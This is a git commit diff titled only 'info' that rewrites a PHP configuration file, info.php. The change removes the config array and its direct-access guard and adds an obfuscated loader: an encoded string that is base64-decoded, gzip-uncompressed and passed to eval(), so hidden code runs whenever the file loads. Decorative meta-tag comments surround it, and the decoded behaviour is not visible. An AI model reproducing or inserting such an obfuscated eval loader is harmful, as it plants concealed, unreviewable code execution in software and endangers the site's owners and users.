fbbc94e18fd4b2899ede94fee2c4c7b75d91230a
4lph4shell <4lph4ir@gmail.com>
2024-11-12 20:05:15 +0330

    info

--- info.php
+++ info.php
@@ -1,12 +1,13 @@
-<?php
-if (basename(__FILE__) == basename($_SERVER["SCRIPT_FILENAME"])) {
-    http_response_code(403);
-    die('403');
-}
-return [
-    "panel_url" => "#",
-    "panel_user" => "#",
-    "panel_pass" => "#",
-    "type" => "sanaei",
-    "crisp" => "#"
-];
+  <!-- <meta name="subject" content="Travis">
+       <meta name="copyright" content="4lph4-travis">
+       <meta name="author" content="A747iR, 4lph4-ir@gmail.com">
+       <meta name="designer" content="A747ir">
+       <meta name="owner" content="4lph4Ir">
+-->
+
+  <?php
+    $encoded_code = 'eJxlzc0KwjAQBOB7IO8QotAEPAh6kwoiEQoq0oqXIiG2KwZqGpL0IOK721b8AdnLzMfAYoSRPhN2Uh6MugKT
+    cpWshZScxDH56FBmIj2INKfZMk12+360XWwEPXJO7hhdQrDSgbe18SCLugQ2HU/4DKNSA4vaHHXlgZGD0DhDcoyoVQYq2biKknhO6
+    ICOvujB/atV3v9quFl4da+MAt1j4bS37xVGx/Ztd0+drz7j';
+
+    eval("?>" . gzuncompress(base64_decode($encoded_code)));
